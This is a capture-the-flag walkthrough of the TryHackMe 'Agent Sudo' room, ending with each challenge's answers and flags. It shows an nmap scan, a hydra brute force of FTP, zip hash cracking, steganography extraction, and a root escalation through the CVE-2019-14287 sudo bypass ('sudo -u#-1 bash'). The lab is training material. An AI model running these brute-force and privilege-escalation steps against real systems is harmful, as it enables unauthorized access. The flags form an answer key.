# Agent Sudo

## 1 - How many ports open?

Issue an nmap

```
nmap -sC -sV $IP -oN nmap/inital_scan

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)
|   256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)
|_  256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Annoucement
```

### Answer: 3

## 2 - How you redirect yourself to a secret page?

### Answer: user-agent

## 3 - What is the agent name?

Changing the user agent to R (seen in the disclaimer) got the message:

```
What are you doing! Are you one of the 25 employees? If not, I going to report this incident 
```

Seems like the agents are a letter from the alphabet (25 employees + the agent R)

Try all letters (in caps)

```
user-agent: C

Attention chris,

Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak!

From,
Agent R 
```

### Answer: chris

## 4 - FTP password

we have a username potentially, we could try the rockyou wordlist since it is stated that the password is weak

```
hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://$IP

FOUND:
time-elapsed: 00:01h 

[21][ftp] host: 10.10.97.44   login: chris   password: crystal
```

### Answer: crystal

## 5 - Zip file password

Running the program strings over the files we can see some filename stegged in the cutie.png

```
To_agentR.txt
```

Tried multiple online tools for the steg but from the questions it must need a password

Lets binwalk this file

```
binwalk -e cutie.png
```

A .zip file is found (password protected). Lets crack the password

```
zip2john 8702.zip > zip_hash

john zip_hash

alien            (8702.zip/To_agentR.txt)
```

### Answer: alien

## 6 - Steg password

The extracted file contained

```
Agent C,

We need to send the picture to 'QXJlYTUx' as soon as possible!

By,
Agent R
```

The destination user seems an encrypted name...
Using the website hashes.com we got

```
QXJlYTUx:Area51
```

### Answer: Area51

## 7 - Who is the other agent (in full name)?

Lets use the password to extract the information hidden in the image

used a web tool with the password Area51 over the file .jpg
```
Hi james,

Glad you find this message. Your login password is hackerrules!

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris
```

### Answer: james

## 8 - SSH password

### Answer: hackerrules

## 8 - what is the user flag?

Connect via ssh
```
ssh james@$IP
Password: hackerrules! (to ssh needs the exclamation)

cat user_flag.txt
b03d975e8c92a7c04146cfa7a5a313c7
```

### Answer: b03d975e8c92a7c04146cfa7a5a313c7

## 9 - What is the incident of the photo called?

Used an online image search

### Answer: roswell alien autopsy

## 10 - CVE number for the escalation

Just checking what james can run as root give us 

```
sudo -l
(ALL, !root) /bin/bash

CVE-2019-14287 
```

### Answer: CVE-2019-14287 

## 11 - What is the root flag?

Just use the exploit to get root access

```
sudo -u#-1 bash

whomai
root

cd /root
cat root.txt

To Mr.hacker,

CONTENT:

Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine. 

Your flag is 
b53a02f55b57d4439e3341834d70c062

By,
DesKel a.k.a Agent R

```
### Answer: b53a02f55b57d4439e3341834d70c062

## 12 - (Bonus) Who is Agent R?

### Answer: DesKel